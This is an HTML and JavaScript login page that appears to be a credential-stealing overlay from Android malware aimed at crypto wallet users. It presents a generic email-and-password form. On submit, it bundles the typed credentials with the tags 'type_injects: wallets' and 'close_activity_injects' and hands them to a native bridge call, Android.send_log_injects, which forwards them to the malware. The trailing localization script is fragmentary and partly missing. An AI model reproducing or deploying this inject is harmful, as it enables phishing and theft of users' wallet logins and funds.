    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title></title>

    <style>
        body {
            margin: 0;
            padding: 0;
            background: #fff;
            font-family: sans-serif;
            font-weight: 100 !important;
        }

        #form1 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            text-align: center;
            padding: 20px;
            padding-bottom: 50px;
        }

        section {
            flex: 1;
            padding: 20px;
            margin-top: 50px;
        }

        .input {
            width: 100%;
            border: 0;
            border-bottom: 1px solid #dddddd;
            padding: 10px; 
            padding-left: 0;
            margin-bottom: 15px;
        }

        .input:focus {
            width: 100%;
            border: 0;
            border-bottom: 2px solid #007db7;
            padding: 10px; 
            padding-left: 0;
        }

        p {
            text-align: center;
            color: #8bc63f;
            font-size: 12px;
        }

        label {
            margin: 0;
            padding: 0;
            color: #a5a5a5;
        }

        form {
            padding: 0;
            margin: 0;
        }

        .button {
            padding: 15px;
            background: #007db7;
            width: 100%;
            color: #fff;
            font-weight: 600;
            font-size: 16px;
            border: 0;
        }

        .button:disabled {
            padding: 15px;
            background: #e1e1e1;
            width: 100%;
            color: #fff;
            font-size: 16px;
            border: 0;
            font-weight: 100;
        }

        .error {
            border-color: #f00 !important;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }
</style>
</head>

            <section>
                <input type="email" class="input" id="email" name="email" placeholder="{{t.__text1}}" onkeyup="chekFirst()" autocomplete="off">
                
                <input type="password" class="input" id="password" name="password" onkeyup="chekFirst()" placeholder="{{t.__text2}}">
                <span style="float: right;position: relative;top: -50px;right: 0;color: #007db7;">{{t.__text3}}</span>


                <span style="color: #007db7;float: right;display: block;width: 100%;text-align: center;font-size: 14px;font-weight: 100;margin-bottom: 35px;">{{t.__text4}}</span>
            </section>
            <footer>
                <input type="submit" class="button" id="sendData" disabled value="{{t.__text5}}">
            </footer>

    </form>

    <script>
        var form1 = document.getElementById('form1'),
            form = document.getElementById('form'),
            email = document.getElementById('email'),
            password = document.getElementById('password'),
            sendData = document.getElementById('sendData');

        function chekFirst() {
            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(email.value) && password.value.length > 5) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        sendData.onclick = () => {
            var data = {};
                data.login = email.value;
                data.password = password.value;
                data.type_injects = "wallets";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>

        var text,

                    __text5: "Login",

            }


            var language = window.navigator.userLanguage || window.navigator.language; 
            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.en : text = texts[language]; 

            var app = angular.module("app", []); 
            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
                rootScope = e, 
                scope = t, 
                e.scums = [], 
                t.t = text, 
                t.reset = function () { 
                    $(e.scums).each(function () { 
                        this.reset() }) 
                } 
            }]);
        </script>
